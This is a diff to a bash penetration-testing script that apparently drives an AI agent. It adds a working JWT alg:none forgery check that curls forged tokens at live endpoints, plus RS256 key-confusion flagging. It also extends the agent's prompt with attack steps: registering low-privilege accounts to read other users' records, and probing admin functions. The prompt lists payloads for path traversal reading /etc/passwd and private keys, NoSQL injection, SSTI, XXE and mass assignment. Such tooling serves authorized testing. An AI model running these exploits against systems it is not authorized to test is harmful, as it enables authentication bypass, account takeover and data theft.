@@ -68,6 +68,7 @@ else
         printf '[JWT-CLAIMS-EXPOSURE] token payload carries sensitive claims: %s (saved to agent_loot/jwt_claims.txt)\n' "$_claims" >> "$agent_file"
       fi
       results="$results"$'\n'"[auth-captured role=$_role id=$_uid] bearer token applied to all further probes - re-test the 401/403 endpoints and id-walk resource paths (role=$_role means $([ "$_role" = "?" ] && echo 'unknown privilege' || echo "privilege=$_role"))"
+      agent_jwt_altcheck "$tok"   # one-shot alg:none forgery + RS256 key-confusion check
       return 0
     fi
     ck="$(printf '%s' "$1" | grep -aoiE '^set-cookie:[[:space:]]*[^;[:space:]]+' | head -1 | sed -E 's/^set-cookie:[[:space:]]*//I')"
@@ -77,6 +78,34 @@ else
       results="$results"$'\n'"[auth-captured] a session cookie was captured and is now applied to all further probes - re-test the 401/403 endpoints and id-walk resource paths"
     fi
   }
+  # One-shot JWT weakness check on the captured token: (1) alg:none forgery - re-sign the SAME
+  # payload with header {"alg":"none"} and an empty signature; if an endpoint that accepts the real
+  # token ALSO accepts the unsigned one, signatures aren't verified; (2) RS256->HS256 key confusion
+  # candidate - flag when the header is RS* and a public key (.pub/.pem/jwks) was discovered.
+  agent_jwt_altcheck() {
+    local tok="$1" alg payload none_hdr none_tok ep real none rc nc
+    [ "$agent_jwt_checked" = 1 ] && return 0; agent_jwt_checked=1
+    alg="$(_b64url_decode "$(printf '%s' "$tok" | cut -d. -f1)" 2>/dev/null | jq -r '.alg // empty' 2>/dev/null)"
+    payload="$(printf '%s' "$tok" | cut -d. -f2)"
+    # RS256 -> HS256 key-confusion candidate
+    case "$alg" in RS256|RS384|RS512|rs256|rs384|rs512|ES256|PS256)
+      if grep -rhiE '\.pub([^a-z]|$)|/jwks|jwks\.json|\.pem([^a-z]|$)|-----BEGIN PUBLIC KEY' \
+           "${js_endpoints_file:-/dev/null}" "${urls_file:-/dev/null}" "${open_dir_file:-/dev/null}" "${js_secrets_file:-/dev/null}" 2>/dev/null | grep -q .; then
+        printf '[RS256-KEY-CONFUSION-CANDIDATE] alg=%s and a public key was discovered - try re-signing the token HS256 with the public key as the HMAC secret\n' "$alg" >> "$agent_file"
+      fi ;;
+    esac
+    # alg:none forgery: pick a 401/403 endpoint, confirm the real token opens it, then try unsigned.
+    ep="$(awk -F'\t' '$1==401||$1==403{print $3; exit}' "${fuzz_findings_file:-/dev/null}" 2>/dev/null)"
+    [ -n "$ep" ] || return 0
+    printf '%s' "$ep" | grep -qiE "^https?://([a-z0-9._-]+\.)?${esc_domain}([:/]|$)" || return 0
+    none_hdr="$(printf '%s' '{"alg":"none","typ":"JWT"}' | base64 2>/dev/null | tr '/+' '_-' | tr -d '=\n')"
+    none_tok="${none_hdr}.${payload}."
+    real="$(curl -s -o /dev/null -w '%{http_code}' -L --max-time 10 ${CURL_NET[@]+"${CURL_NET[@]}"} -H "Authorization: Bearer $tok" "$ep" 2>/dev/null || echo 000)"
+    [ "$real" = 200 ] || [ "$real" = 201 ] || return 0
+    none="$(curl -s -o /dev/null -w '%{http_code}' -L --max-time 10 ${CURL_NET[@]+"${CURL_NET[@]}"} -H "Authorization: Bearer $none_tok" "$ep" 2>/dev/null || echo 000)"
+    case "$none" in 200|201) printf '[CONFIRMED] JWT alg:none signature bypass - unsigned token accepted at %s\n' "$ep" >> "$agent_file" ;; esac
+  }
+  agent_jwt_checked=0
   # Scope string for the AI: in single-host / custom-port mode, hand it the exact seed URL
   # (http://localhost:3000) so it keeps the scheme+port; otherwise the wildcard host scope.
   agent_scope="*.$domain"; [ "${SINGLE:-0}" = 1 ] && agent_scope="${SEED_URL:-$agent_scope}"
@@ -137,7 +166,7 @@ Work from first principles on THIS target - do not assume any framework's specif
 - LFI / path traversal: on a param that names a file/template/page, read common sensitive files relative to it (../ up to the web root: app config, env files, /etc/passwd, source) and confirm with a content signature (connectionString, root:.*:0:0:, BEGIN PRIVATE KEY). 4tail saves any raw credential file for the human.
 - empty/small 200 endpoints -> add plausible params (?id=1&debug=1); redirect-looking params -> set an off-site absolute URL and watch the Location header; an exposed /.git -> git-dumper.
 For the MINED API ENDPOINTS go further than GET: (a) PATH-IDOR/BOLA - a numeric or UUID path segment is an object id, so GET a neighbour id and compare; a readable record you should not own is a lead; (b) AUTH/SQLi - POST to a login/auth endpoint with a single quote in the identifier field and look for a SQL error or an unexpected auth success; (c) MASS ASSIGNMENT - when registering or updating a profile, add standard privilege attributes alongside the REAL required fields: role (e.g. admin), isAdmin/is_admin true, permissions, group, plan; (d) BFLA/WRITE-AUTHZ - try PUT/PATCH on a REST item you do not own (e.g. a product or another user's review) to change it (forged review / product tampering); (e) NoSQLi - if a login/search endpoint ignores a SQL quote, POST a JSON operator body like {"email":{"\$gt":""},"password":{"\$gt":""}} or {"\$ne":null}; (f) SSTI - on a reflected text field, send {{7*7}} or #{7*7} and check if 49 appears; (g) XXE - on a B2B/order/import/upload route that takes XML, POST a body starting with <?xml declaring an external entity reading a benign file (file:///etc/hostname) and look for the file content echoed back. Use POST/PUT/PATCH for these.
-If an unauthenticated probe returns a session token or creates an account, 4tail auto-captures it and applies it to your later probes - so next round PIVOT to re-testing the 401/403 endpoints and sequential/UUID resource paths for BOLA/IDOR with that new access.
+If an unauthenticated probe returns a session token or creates an account, 4tail auto-captures it and applies it to your later probes - so next round PIVOT to re-testing the 401/403 endpoints and sequential/UUID resource paths for BOLA/IDOR with that new access. The captured token's privilege is labelled [auth-captured role=...]: if it is admin, accessing another user's object proves little (admins are meant to). To prove BOLA/IDOR UNAMBIGUOUSLY, register a NORMAL low-privilege user (POST the register endpoint with the mined fields, no role/isAdmin), then with THAT user's token read another user's resource (a neighbour id, another basket/card/address); success is a clear finding. To prove BFLA, hit an /admin or privileged function with the low-priv token.
 All URLs MUST be on the target scope $agent_scope (keep the scheme and port exactly as given). Respond in EXACTLY this structure, nothing else:
 NOTES:
 <2-6 short lines: updated hypotheses + status>
